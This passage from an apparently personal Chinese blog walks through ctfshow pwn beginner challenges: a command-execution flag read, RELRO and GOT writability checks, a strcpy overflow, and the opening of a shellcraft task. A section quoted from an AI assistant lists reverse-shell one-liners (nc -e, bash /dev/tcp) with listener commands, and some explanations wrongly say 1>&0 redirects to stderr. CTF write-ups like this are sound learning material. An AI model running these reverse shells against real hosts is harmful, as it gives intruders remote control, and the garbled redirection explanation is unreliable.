<li><code>read(0, &amp;buf, 0x20uLL)</code>    从标准输入中读取用户输入的命令，并存储在 buf 中</li>
<li><code>system(&amp;buf)</code>     执行用户输入的命令。</li>
</ul>
</li>
<li>
<p>我们可以使用了 <code>exec 函数来执行sh命令</code>，并使用 <code>1&gt;&amp;0 来进行输出重定向</code>。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p>
</li>
<li>
<p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，可以在该环境中执行命令并与用户进行交互。</p>
</li>
<li>
<p>也可以直接<code>exec cat /ctf* 1&gt;&amp;0</code> 将 <code>cat /ctf*</code>命令的输出发送到标准输入，实际上就是将命令的输出再次输出到屏幕上。</p>
<ol>
<li><strong>执行<code>cat</code>命令</strong>：<code>exec</code>系统调用用于替换当前进程的映像，即它将当前正在运行的程序替换成由其参数指定的新程序。在这个例子中，新程序是<code>cat</code>命令</li>
<li><strong>查找并显示旗帜文件</strong>：<code>cat /ctf*</code>这一部分意味着<code>cat</code>命令将尝试显示所有以<code>ctf</code>开头的文件的内容。假设存在一个名为<code>ctfshow_flag</code>的文件，那么<code>cat</code>命令将会显示它的内容。这是许多CTF竞赛中常见的做法，旗帜文件通常包含解题的关键</li>
<li><strong>重定向标准输出到标准错误</strong>：<code>1&gt;&amp;0</code>是输出重定向语法的一部分，这里的<code>1</code>指的是标准输出（stdout），<code>0</code>指的是标准输入（stdin）。<code>&amp;</code>符号表示“复制描述符”。因此，<code>1&gt;&amp;0</code>意味着<u>将标准输出重定向到标准错误输出（stderr）的位置</u>，即原本标准输入被读取的地方。在大多数情况下，<code>stderr</code>和<code>stdout</code>都默认连接到终端，但它们可以被分别重定向到不同的地方</li>
<li><strong>规避父进程的输出捕获</strong>：在程序中，父进程在等待子进程结束后，会打印一条消息说“flag is not here!”。通过将<code>cat</code>命令的标准输出重定向到标准错误，我们可以利用子进程执行<code>cat</code>命令时的输出，而不是等待父进程的输出。由于父进程在<code>wait</code>之后立即调用了<code>printf</code>，它实际上是在读取标准输出，但我们的<code>cat</code>命令输出被<u>重定向到了标准错误</u>，因此<u>不会被父进程捕获</u></li>
<li><strong>利用子进程的shell</strong>：当用户在子进程中输入<code>exec cat /ctf* 1&gt;&amp;0</code>并执行时，子进程会被替换为<code>cat</code>命令，显示旗帜文件的内容，而这些内容不会被父进程看到，因为输出重定向到了标准错误，而不是标准输出</li>
</ol>
</li>
<li>
<p>这里限制了20个字节，**<u><em>反弹shell</em></u>**的话理论上也可行，感兴趣的可以自行去尝试</p>
</li>
</ul>
<h4 id="反弹shell（当然现在还不知道咋搞"><a class="header-anchor" href="#反弹shell（当然现在还不知道咋搞">¶</a>反弹shell（当然现在还不知道咋搞</h4>
<ul>
<li>以下来自通义灵码回答，苯人还在探索怎么做</li>
</ul>
<h5 id="1-选择反弹shell的命令"><a class="header-anchor" href="#1-选择反弹shell的命令">¶</a>1. 选择反弹shell的命令</h5>
<p>你需要一个简短的命令来建立一个从目标机器到你的机器的反向连接。对于基于bash的shell，你可以使用以下命令之一：</p>
<ul>
<li><strong>ncat</strong>: <code>ncat -e /bin/bash &lt;your IP&gt; &lt;your listening port&gt;</code></li>
<li><strong>netcat</strong>: <code>nc &lt;your IP&gt; &lt;your listening port&gt; -e /bin/bash</code></li>
<li><strong>bash</strong>: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;your IP&gt;/&lt;your listening port&gt; 0&gt;&amp;1'</code></li>
</ul>
<p>其中 <code>&lt;your IP&gt;</code> 是你控制的机器的IP地址，<code>&lt;your listening port&gt;</code> 是你将在上面监听的端口。</p>
<h5 id="2-在你的机器上监听端口"><a class="header-anchor" href="#2-在你的机器上监听端口">¶</a>2. 在你的机器上监听端口</h5>
<p>在你的机器上，使用<code>ncat</code>或<code>netcat</code>来监听指定的端口。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ncat -lvnp &lt;your listening port&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1nc -lvp &lt;your listening port&gt;</span><br></pre></td></tr></table></figure>
<p>这将打开一个监听连接，等待目标机器的反向连接</p>
<h5 id="3-在目标机器上执行反弹shell命令"><a class="header-anchor" href="#3-在目标机器上执行反弹shell命令">¶</a>3. 在目标机器上执行反弹shell命令</h5>
<p>在目标机器上，你只有20个字节的输入空间。你需要确保你的反弹shell命令足够短小，同时包含必要的信息。例如，对于<code>ncat</code>命令，你可以这样输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ncat -e /bin/bash IP PORT</span><br></pre></td></tr></table></figure>
<p>但因为IP地址和端口号占用了不少字符，你需要精简这个命令。一种方法是使用<code>bash</code>命令，它通常更紧凑：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
<p>但是由于字符限制，你可能需要进一步缩短IP地址，使用数字形式而不是域名，或者使用特殊的字符编码技术来减少字符数</p>
<h5 id="4-输入反弹shell命令"><a class="header-anchor" href="#4-输入反弹shell命令">¶</a>4. 输入反弹shell命令</h5>
<p>在目标机器的输入限制内，尽可能准确地输入反弹shell命令。例如，如果你的IP地址是<code>192.168.1.1</code>，并且你监听的端口是<code>1234</code>，你的命令可能是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.1/1234 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
<p>但是由于字符限制，你可能需要进一步优化这个命令</p>
<h5 id="示例"><a class="header-anchor" href="#示例">¶</a>示例</h5>
<p>一个极端的压缩版本，假设你的IP地址是<code>127.0.0.1</code>和端口是<code>4444</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
<p>但是，请注意，<code>127.0.0.1</code>通常表示本地主机，所以在这个上下文中，你应当使用实际的IP地址</p>
<h3 id="020-got和-got-plt表"><a class="header-anchor" href="#020-got和-got-plt表">¶</a>020  .got和.got.plt表</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn020/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位  仅开启NX保护，RELRO保护完全关闭</span><br></pre></td></tr></table></figure>
<h4 id="RELRO保护"><a class="header-anchor" href="#RELRO保护">¶</a>RELRO保护</h4>
<ul>
<li>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。</li>
<li>它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure LinkageTable，简称 PLT）的可写性来防止针对这些结构的攻击</li>
</ul>
<h5 id="三种状态"><a class="header-anchor" href="#三种状态">¶</a>三种状态</h5>
<ol>
<li>
<p><strong>No RELRO</strong>：在这种状态下，GOT和PLT都是可写的，意味着攻击者可以修改这些表中的指针，从而进行攻击。这是最弱的保护状态。</p>
</li>
<li>
<p><strong>Partial RELRO</strong>：在这种状态下，GOT的开头部分被设置为只读（RO），而剩余部分仍然可写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p>
</li>
<li>
<p><strong>Full RELRO</strong>：在这种状态下，GOT和PLT都被设置为只读（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p>
</li>
</ol>
<h4 id="开始解题"><a class="header-anchor" href="#开始解题">¶</a>开始解题</h4>
<ul>
<li>
<pre><code>checksec pwn
[*] '/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn020/pwn'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
64位  仅开了NX保护  RELRO完全关闭
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `objdump -R pwn`   用来显示可执行文件 `pwn` 中的动态重定位条目（dynamic relocation entries）   使用 `-R` 选项时，`objdump` 会输出所有动态重定位条目的列表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>objdump -R pwn</p>
<p>pwn:     file format elf64-x86-64</p>
<p>DYNAMIC RELOCATION RECORDS<br>
OFFSET           TYPE              VALUE<br>
0000000000600f18 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5<br>
0000000000600f20 R_X86_64_GLOB_DAT  <strong>gmon_start</strong><br>
0000000000600f40 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5<br>
0000000000600f48 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5<br>
0000000000600f50 R_X86_64_JUMP_SLOT  strtol@GLIBC_2.2.5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `readelf -S pwn`   查看表项地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>readelf -S pwn<br>
There are 29 section headers, starting at offset 0x1878:</p>
<p>Section Headers:<br>
[Nr] Name              Type             Address           Offset<br>
Size              EntSize          Flags  Link  Info  Align<br>
[ 0]                   NULL             0000000000000000  00000000<br>
0000000000000000  0000000000000000           0     0     0<br>
[ 1] .interp           PROGBITS         0000000000400200  00000200<br>
000000000000001c  0000000000000000   A       0     0     1<br>
[ 2] .note.ABI-tag     NOTE             000000000040021c  0000021c<br>
0000000000000020  0000000000000000   A       0     0     4<br>
[ 3] .note.gnu.build-i NOTE             000000000040023c  0000023c<br>
0000000000000024  0000000000000000   A       0     0     4<br>
[ 4] .gnu.hash         GNU_HASH         0000000000400260  00000260<br>
000000000000001c  0000000000000000   A       5     0     8<br>
[ 5] .dynsym           DYNSYM           0000000000400280  00000280<br>
0000000000000090  0000000000000018   A       6     1     8<br>
[ 6] .dynstr           STRTAB           0000000000400310  00000310<br>
000000000000004b  0000000000000000   A       0     0     1<br>
[ 7] .gnu.version      VERSYM           000000000040035c  0000035c<br>
000000000000000c  0000000000000002   A       5     0     2<br>
[ 8] .gnu.version_r    VERNEED          0000000000400368  00000368<br>
0000000000000020  0000000000000000   A       6     1     8<br>
[ 9] .rela.dyn         RELA             0000000000400388  00000388<br>
0000000000000030  0000000000000018   A       5     0     8<br>
[10] .rela.plt         RELA             00000000004003b8  000003b8<br>
0000000000000048  0000000000000018  AI       5    22     8<br>
[11] .init             PROGBITS         0000000000400400  00000400<br>
0000000000000017  0000000000000000  AX       0     0     4<br>
[12] .plt              PROGBITS         0000000000400420  00000420<br>
0000000000000040  0000000000000010  AX       0     0     16<br>
[13] .text             PROGBITS         0000000000400460  00000460<br>
0000000000000252  0000000000000000  AX       0     0     16<br>
[14] .fini             PROGBITS         00000000004006b4  000006b4<br>
0000000000000009  0000000000000000  AX       0     0     4<br>
[15] .rodata           PROGBITS         00000000004006c0  000006c0<br>
000000000000053a  0000000000000000   A       0     0     8<br>
[16] .eh_frame_hdr     PROGBITS         0000000000400bfc  00000bfc<br>
000000000000003c  0000000000000000   A       0     0     4<br>
[17] .eh_frame         PROGBITS         0000000000400c38  00000c38<br>
0000000000000100  0000000000000000   A       0     0     8<br>
[18] .init_array       INIT_ARRAY       0000000000600d38  00000d38<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[19] .fini_array       FINI_ARRAY       0000000000600d40  00000d40<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[20] .dynamic          DYNAMIC          0000000000600d48  00000d48<br>
00000000000001d0  0000000000000010  WA       6     0     8<br>
[21] .got              PROGBITS         0000000000600f18  00000f18<br>
0000000000000010  0000000000000008  WA       0     0     8<br>
[22] .got.plt          PROGBITS         0000000000600f28  00000f28<br>
0000000000000030  0000000000000008  WA       0     0     8<br>
[23] .data             PROGBITS         0000000000600f58  00000f58<br>
0000000000000010  0000000000000000  WA       0     0     8<br>
[24] .bss              NOBITS           0000000000600f68  00000f68<br>
0000000000000008  0000000000000000  WA       0     0     1<br>
[25] .comment          PROGBITS         0000000000000000  00000f68<br>
0000000000000029  0000000000000001  MS       0     0     1<br>
[26] .symtab           SYMTAB           0000000000000000  00000f98<br>
00000000000005e8  0000000000000018          27    43     8<br>
[27] .strtab           STRTAB           0000000000000000  00001580<br>
00000000000001f1  0000000000000000           0     0     1<br>
[28] .shstrtab         STRTAB           0000000000000000  00001771<br>
0000000000000103  0000000000000000           0     0     1<br>
Key to Flags:<br>
W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>
L (link order), O (extra OS processing required), G (group), T (TLS),<br>
C (compressed), x (unknown), o (OS specific), E (exclude),<br>
l (large), p (processor specific)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 提取关键部分：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>[21] .got        PROGBITS         0000000000600f18  00000f18<br>
0000000000000010  0000000000000008  WA     0    0     8<br>
[22] .got.plt    PROGBITS       0000000000600f28  00000f28<br>
0000000000000030  0000000000000008  WA     0     0     8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `.got`  `600f18`</span><br><span class="line">- `.got.plt`  `600f28`</span><br><span class="line">- 测试一下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>./pwn 600f18<br>
RELRO: 52454c52</p>
<p>ctfshow@ubuntu:~/Desktop/ctfshow-pwn-primary/pwn020$ ./pwn 600f28<br>
RELRO: 52454c52</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 发现程序正常执行，.got表和.got.plt表都可写</span><br><span class="line">- ctfshow&#123;1_1_0x600f18_0x600f28&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 021  .got和.got.plt表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>checksec pwn<br>
[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn021/pwn’<br>
Arch:     amd64-64-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x400000)<br>
64位   NX关闭   RELRO保护部分开启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>objdump -R pwn</p>
<p>pwn:     file format elf64-x86-64</p>
<p>DYNAMIC RELOCATION RECORDS<br>
OFFSET           TYPE              VALUE<br>
0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5<br>
0000000000600ff8 R_X86_64_GLOB_DAT  <strong>gmon_start</strong><br>
0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5<br>
0000000000601020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5<br>
0000000000601028 R_X86_64_JUMP_SLOT  strtol@GLIBC_2.2.5</p>
<p>readelf -S pwn<br>
There are 29 section headers, starting at offset 0x1950:</p>
<p>Section Headers:<br>
[Nr] Name              Type             Address           Offset<br>
Size              EntSize          Flags  Link  Info  Align<br>
[ 0]                   NULL             0000000000000000  00000000<br>
0000000000000000  0000000000000000           0     0     0<br>
[ 1] .interp           PROGBITS         0000000000400238  00000238<br>
000000000000001c  0000000000000000   A       0     0     1<br>
[ 2] .note.ABI-tag     NOTE             0000000000400254  00000254<br>
0000000000000020  0000000000000000   A       0     0     4<br>
[ 3] .note.gnu.build-i NOTE             0000000000400274  00000274<br>
0000000000000024  0000000000000000   A       0     0     4<br>
[ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298<br>
000000000000001c  0000000000000000   A       5     0     8<br>
[ 5] .dynsym           DYNSYM           00000000004002b8  000002b8<br>
0000000000000090  0000000000000018   A       6     1     8<br>
[ 6] .dynstr           STRTAB           0000000000400348  00000348<br>
000000000000004b  0000000000000000   A       0     0     1<br>
[ 7] .gnu.version      VERSYM           0000000000400394  00000394<br>
000000000000000c  0000000000000002   A       5     0     2<br>
[ 8] .gnu.version_r    VERNEED          00000000004003a0  000003a0<br>
0000000000000020  0000000000000000   A       6     1     8<br>
[ 9] .rela.dyn         RELA             00000000004003c0  000003c0<br>
0000000000000030  0000000000000018   A       5     0     8<br>
[10] .rela.plt         RELA             00000000004003f0  000003f0<br>
0000000000000048  0000000000000018  AI       5    22     8<br>
[11] .init             PROGBITS         0000000000400438  00000438<br>
0000000000000017  0000000000000000  AX       0     0     4<br>
[12] .plt              PROGBITS         0000000000400450  00000450<br>
0000000000000040  0000000000000010  AX       0     0     16<br>
[13] .text             PROGBITS         0000000000400490  00000490<br>
0000000000000252  0000000000000000  AX       0     0     16<br>
[14] .fini             PROGBITS         00000000004006e4  000006e4<br>
0000000000000009  0000000000000000  AX       0     0     4<br>
[15] .rodata           PROGBITS         00000000004006f0  000006f0<br>
000000000000053a  0000000000000000   A       0     0     8<br>
[16] .eh_frame_hdr     PROGBITS         0000000000400c2c  00000c2c<br>
000000000000003c  0000000000000000   A       0     0     4<br>
[17] .eh_frame         PROGBITS         0000000000400c68  00000c68<br>
0000000000000100  0000000000000000   A       0     0     8<br>
[18] .init_array       INIT_ARRAY       0000000000600e10  00000e10<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[19] .fini_array       FINI_ARRAY       0000000000600e18  00000e18<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[20] .dynamic          DYNAMIC          0000000000600e20  00000e20<br>
00000000000001d0  0000000000000010  WA       6     0     8<br>
[21] .got              PROGBITS         0000000000600ff0  00000ff0<br>
0000000000000010  0000000000000008  WA       0     0     8<br>
[22] .got.plt          PROGBITS         0000000000601000  00001000<br>
0000000000000030  0000000000000008  WA       0     0     8<br>
[23] .data             PROGBITS         0000000000601030  00001030<br>
0000000000000010  0000000000000000  WA       0     0     8<br>
[24] .bss              NOBITS           0000000000601040  00001040<br>
0000000000000008  0000000000000000  WA       0     0     1<br>
[25] .comment          PROGBITS         0000000000000000  00001040<br>
0000000000000029  0000000000000001  MS       0     0     1<br>
[26] .symtab           SYMTAB           0000000000000000  00001070<br>
00000000000005e8  0000000000000018          27    43     8<br>
[27] .strtab           STRTAB           0000000000000000  00001658<br>
00000000000001f1  0000000000000000           0     0     1<br>
[28] .shstrtab         STRTAB           0000000000000000  00001849<br>
0000000000000103  0000000000000000           0     0     1<br>
Key to Flags:<br>
W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>
L (link order), O (extra OS processing required), G (group), T (TLS),<br>
C (compressed), x (unknown), o (OS specific), E (exclude),<br>
l (large), p (processor specific)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>[21] .got       PROGBITS     0000000000600ff0  00000ff0<br>
0000000000000010  0000000000000008  WA    0   0   8<br>
[22] .got.plt      PROGBITS     0000000000601000  00001000<br>
0000000000000030  0000000000000008  WA  0   0     8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 程序头多了GNU_RELRO，将.dynamic 、.got标记为只读权限（R），那么在重定向完成后，动态链接器就会将这个区域保护起来</span><br><span class="line">- 写.got表的时候就会抛出异常，而写.got.plt依旧正常</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>./pwn 600ff0<br>
Segmentation fault</p>
<p>ctfshow@ubuntu:~/Desktop/ctfshow-pwn-primary/pwn021$ ./pwn 601000<br>
RELRO: 52454c52</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ctfshow&#123;0_1_0x600ff0_0x601000&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 022  .got和.got.plt表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>checksec pwn<br>
[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn022/pwn’<br>
Arch:     amd64-64-little<br>
RELRO:    Full RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x400000)<br>
64位  完全开启了RELRO保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>readelf -S pwn<br>
There are 28 section headers, starting at offset 0x1900:</p>
<p>Section Headers:<br>
[Nr] Name              Type             Address           Offset<br>
Size              EntSize          Flags  Link  Info  Align<br>
[ 0]                   NULL             0000000000000000  00000000<br>
0000000000000000  0000000000000000           0     0     0<br>
[ 1] .interp           PROGBITS         0000000000400238  00000238<br>
000000000000001c  0000000000000000   A       0     0     1<br>
[ 2] .note.ABI-tag     NOTE             0000000000400254  00000254<br>
0000000000000020  0000000000000000   A       0     0     4<br>
[ 3] .note.gnu.build-i NOTE             0000000000400274  00000274<br>
0000000000000024  0000000000000000   A       0     0     4<br>
[ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298<br>
000000000000001c  0000000000000000   A       5     0     8<br>
[ 5] .dynsym           DYNSYM           00000000004002b8  000002b8<br>
0000000000000090  0000000000000018   A       6     1     8<br>
[ 6] .dynstr           STRTAB           0000000000400348  00000348<br>
000000000000004b  0000000000000000   A       0     0     1<br>
[ 7] .gnu.version      VERSYM           0000000000400394  00000394<br>
000000000000000c  0000000000000002   A       5     0     2<br>
[ 8] .gnu.version_r    VERNEED          00000000004003a0  000003a0<br>
0000000000000020  0000000000000000   A       6     1     8<br>
[ 9] .rela.dyn         RELA             00000000004003c0  000003c0<br>
0000000000000030  0000000000000018   A       5     0     8<br>
[10] .rela.plt         RELA             00000000004003f0  000003f0<br>
0000000000000048  0000000000000018  AI       5    21     8<br>
[11] .init             PROGBITS         0000000000400438  00000438<br>
0000000000000017  0000000000000000  AX       0     0     4<br>
[12] .plt              PROGBITS         0000000000400450  00000450<br>
0000000000000040  0000000000000010  AX       0     0     16<br>
[13] .text             PROGBITS         0000000000400490  00000490<br>
0000000000000252  0000000000000000  AX       0     0     16<br>
[14] .fini             PROGBITS         00000000004006e4  000006e4<br>
0000000000000009  0000000000000000  AX       0     0     4<br>
[15] .rodata           PROGBITS         00000000004006f0  000006f0<br>
000000000000053a  0000000000000000   A       0     0     8<br>
[16] .eh_frame_hdr     PROGBITS         0000000000400c2c  00000c2c<br>
000000000000003c  0000000000000000   A       0     0     4<br>
[17] .eh_frame         PROGBITS         0000000000400c68  00000c68<br>
0000000000000100  0000000000000000   A       0     0     8<br>
[18] .init_array       INIT_ARRAY       0000000000600dc0  00000dc0<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[19] .fini_array       FINI_ARRAY       0000000000600dc8  00000dc8<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[20] .dynamic          DYNAMIC          0000000000600dd0  00000dd0<br>
00000000000001f0  0000000000000010  WA       6     0     8<br>
[21] .got              PROGBITS         0000000000600fc0  00000fc0<br>
0000000000000040  0000000000000008  WA       0     0     8<br>
[22] .data             PROGBITS         0000000000601000  00001000<br>
0000000000000010  0000000000000000  WA       0     0     8<br>
[23] .bss              NOBITS           0000000000601010  00001010<br>
0000000000000008  0000000000000000  WA       0     0     1<br>
[24] .comment          PROGBITS         0000000000000000  00001010<br>
0000000000000029  0000000000000001  MS       0     0     1<br>
[25] .symtab           SYMTAB           0000000000000000  00001040<br>
00000000000005d0  0000000000000018          26    42     8<br>
[26] .strtab           STRTAB           0000000000000000  00001610<br>
00000000000001f1  0000000000000000           0     0     1<br>
[27] .shstrtab         STRTAB           0000000000000000  00001801<br>
00000000000000fa  0000000000000000           0     0     1<br>
Key to Flags:<br>
W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>
L (link order), O (extra OS processing required), G (group), T (TLS),<br>
C (compressed), x (unknown), o (OS specific), E (exclude),<br>
l (large), p (processor specific)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>[21] .got      PROGBITS      0000000000600fc0  00000fc0<br>
0000000000000040  0000000000000008  WA    0   0   8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 没有了.got.plt，且.got也不可写</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>./pwn 600fc0</p>
<p>Segmentation fault  // 抛出了异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ctfshow&#123;0_0_0x600fc0&#125;</span><br><span class="line"></span><br><span class="line">### 023  溢出？</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>checksec pwn<br>
[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn023/pwn’<br>
Arch:     i386-32-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x8048000)<br>
32位  开启NX保护   部分开启RELRO保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __gid_t v3; // eax</span><br><span class="line">  int v5; // [esp-Ch] [ebp-2Ch]</span><br><span class="line">  int v6; // [esp-8h] [ebp-28h]</span><br><span class="line">  int v7; // [esp-4h] [ebp-24h]</span><br><span class="line">  FILE *stream; // [esp+4h] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, 64, stream);</span><br><span class="line">  signal(11, (__sighandler_t)sigsegv_handler);  // 注册信号处理器  不懂喵= =</span><br><span class="line">  v3 = getegid();  // 获取当前进程的有效组ID</span><br><span class="line">  setresgid(v3, v3, v3, v5, v6, v7, v3);  // 尝试设置进程的实时组ID  但是不懂= =</span><br><span class="line">    </span><br><span class="line">    // 美术部分</span><br><span class="line">  puts(asc_8048940);</span><br><span class="line">  puts(asc_80489B4);</span><br><span class="line">  puts(asc_8048A30);</span><br><span class="line">  puts(asc_8048ABC);</span><br><span class="line">  puts(asc_8048B4C);</span><br><span class="line">  puts(asc_8048BD0);</span><br><span class="line">  puts(asc_8048C64);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : Linux_Security_Mechanisms                               &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : No canary found                                         &quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(&quot;How to input ?&quot;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  if ( argc &gt; 1 )  // 检测是否有额外的命令行参数，并将第一个命令行参数作为参数传递给该函数</span><br><span class="line">    ctfshow((char *)argv[1]);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *__cdecl ctfshow(char *src)</span><br><span class="line">&#123;</span><br><span class="line">  char dest[58]; // [esp+Ah] [ebp-3Eh] BYREF</span><br><span class="line"></span><br><span class="line">  return strcpy(dest, src);</span><br><span class="line">&#125;</span><br><span class="line">/* 接受一个字符串参数 src ，并使用 strcpy 函数将该字符串复制到名</span><br><span class="line">为 dest 的缓冲区中。然后，它返回指向 dest 缓冲区的指针 */</span><br></pre></td></tr></table></figure>
<ul>
<li>当未开启Canary保护时，输入字符串长度超过了 dest 缓冲区的大小，这可能导致缓冲区溢出漏洞</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pwn aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">  </span><br><span class="line">flag&#123;just_test_my_process! &#125;</span><br><span class="line">// 本地测试，懒得连远程</span><br></pre></td></tr></table></figure>
<h3 id="024-pwntools-shellcraft"><a class="header-anchor" href="#024-pwntools-shellcraft">¶</a>024  pwntools-shellcraft</h3>
<ul>
<li>hint：可以使用pwntools的shellcraft模块来进行攻击</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn024/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">32位  仅开启RELRO保护</span><br></pre></td></tr></table></figure>
